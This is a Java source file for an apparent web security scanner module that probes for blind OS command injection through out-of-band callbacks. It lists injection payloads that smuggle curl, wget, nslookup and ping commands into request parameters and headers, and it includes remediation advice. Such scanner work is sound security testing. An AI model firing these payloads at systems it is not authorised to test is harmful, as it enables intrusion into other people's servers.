package com.burpmax.active;

import java.util.*;
import static com.burpmax.model.Finding.*;

/**
 * OOB blind OS command injection probe.
 *
 * Complements CommandInjectionProbe (output-based + time-based) by covering
 * the third class of OS command injection: commands that execute asynchronously
 * or whose output is suppressed, making them invisible to both response-body
 * and timing analysis.
 *
 * Common scenarios:
 *   - Job queues / background workers that process user-supplied fields
 *   - Image/file processors that run shell commands on uploaded content
 *   - Log shippers / audit systems that process request parameters
 *   - Notification services that shell out to send emails or SMS
 *
 * Strategy: inject curl/wget/nslookup/ping commands that trigger an outbound
 * DNS or HTTP callback to the OOB host. One OOB host is shared per endpoint
 * to limit request count; the unique-id portion of the subdomain identifies
 * the specific injection point when the callback arrives.
 *
 * Payload design:
 *   - Uses ; | & ` $() separators to cover different shell contexts
 *   - Includes nslookup as the lowest-common-denominator (no curl/wget needed)
 *   - Windows variants use ping and nslookup (available by default)
 *   - URL-safe encoding avoided — probes inject raw bytes via RequestBuilder
 */
public class BlindCmdiProbe {

    // OOB payload templates — HOST replaced at runtime
    // Ordered from least-intrusive to most intrusive
    private static final List<String[]> OOB_PAYLOADS = List.of(
        // [unix payload, windows payload, label]
        new String[]{
            "; nslookup HOST",
            "& nslookup HOST",
            "nslookup"
        },
        new String[]{
            "; curl -s http://HOST/cmdi",
            "& curl -s http://HOST/cmdi",
            "curl"
        },
        new String[]{
            "; wget -q http://HOST/cmdi -O /dev/null",
            null,
            "wget"
        },
        new String[]{
            "| nslookup HOST",
            "| nslookup HOST",
            "pipe-nslookup"
        },
        new String[]{
            "`nslookup HOST`",
            null,
            "backtick-nslookup"
        },
        new String[]{
            "$(nslookup HOST)",
            null,
            "subshell-nslookup"
        },
        new String[]{
            "; ping -c 1 HOST",
            "& ping -n 1 HOST",
            "ping"
        }
    );

    private static final List<String> INJECTABLE_HEADERS = List.of(
        "User-Agent", "Referer", "X-Forwarded-For", "Cookie",
        "X-Filename", "X-File-Name", "Content-Disposition"
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        if (oob == null || !oob.isAvailable()) return List.of();

        List<ActiveScanResult> results = new ArrayList<>();

        // ── Parameters ────────────────────────────────────────────────────
        for (String param : ctx.allParamNames()) {
            String oobHost = oob.generateHost("cmdi-param-" + param);
            if (oobHost == null) continue;
            injectAll(ctx, rb, sender, oob, oobHost, param, null);
        }

        // ── Headers ───────────────────────────────────────────────────────
        for (String header : INJECTABLE_HEADERS) {
            String oobHost = oob.generateHost("cmdi-hdr-" + header);
            if (oobHost == null) continue;
            injectAll(ctx, rb, sender, oob, oobHost, null, header);
        }

        return results;  // actual findings created after OOB poll
    }

    private static void injectAll(ProbeContext ctx, RequestBuilder rb, HttpSender sender,
                                   OobClient oob, String oobHost,
                                   String param, String header) {
        for (String[] entry : OOB_PAYLOADS) {
            // Try Unix payload
            if (entry[0] != null) {
                String payload = entry[0].replace("HOST", oobHost);
                byte[] req = param != null
                        ? rb.buildProbeRequest(ctx, param, payload)
                        : rb.injectHeader(ctx.originalRequest, header, payload);
                if (req != null) {
                    sender.send(ctx.service, req);   // fire and forget
                    oob.recordInjection(oobHost, "OS Command Injection (Blind OOB)",
                            ctx.url, param != null ? param : header, payload);
                }
            }
            // Try Windows payload (separate host not needed — same oobHost)
            if (entry[1] != null && !entry[1].equals(entry[0])) {
                String payload = entry[1].replace("HOST", oobHost);
                byte[] req = param != null
                        ? rb.buildProbeRequest(ctx, param, payload)
                        : rb.injectHeader(ctx.originalRequest, header, payload);
                if (req != null) sender.send(ctx.service, req);
            }
            // One payload family per injection point is enough to trigger a callback
            break;
        }
    }

    // ── Finding builder (called after OOB poll) ───────────────────────────────
    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        return new ActiveScanResult(
            "OS Command Injection (Blind OOB)", SEV_CRITICAL,
            "Blind OS command injection was confirmed via an out-of-band " +
            hit.interactionType() + " callback. The payload '" + trunc(hit.payload(), 80) +
            "' was injected into '" + hit.parameter() + "' and the server made an outbound " +
            "network request to the OOB host (" + hit.interactionDetail() + "). " +
            "This confirms the injected command was executed by the operating system. " +
            "Unlike time-based detection, OOB confirmation is immune to network jitter and " +
            "server-side caching, making this a high-confidence finding. Full remote code " +
            "execution with web server process privileges is possible.",
            "OOB callback: " + hit.interactionDetail() +
            " | Injection point: " + hit.parameter() +
            " | Payload: " + trunc(hit.payload(), 100),
            "PRIMARY FIX - Avoid Shell Invocation:\n" +
            "Replace shell calls with language-native APIs. If shelling out is unavoidable,\n" +
            "pass arguments as an array (not a concatenated string) to prevent shell interpretation.\n" +
            "  BAD:  Runtime.exec(\"convert \" + userFile)\n" +
            "  GOOD: Runtime.exec(new String[]{\"convert\", userFile})\n\n" +
            "SECONDARY CONTROLS:\n" +
            "- Validate arguments against a strict allowlist of permitted values.\n" +
            "- Run the process as a dedicated low-privilege OS user (no sudo, no root).\n" +
            "- Block outbound DNS/HTTP from the app tier - OOB blind CmdI relies on the server\n" +
            "  making outbound connections. Network-level egress filtering stops exfiltration.\n" +
            "- Apply seccomp/AppArmor to restrict syscalls available to the application process.",
            "CWE-78",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }
}
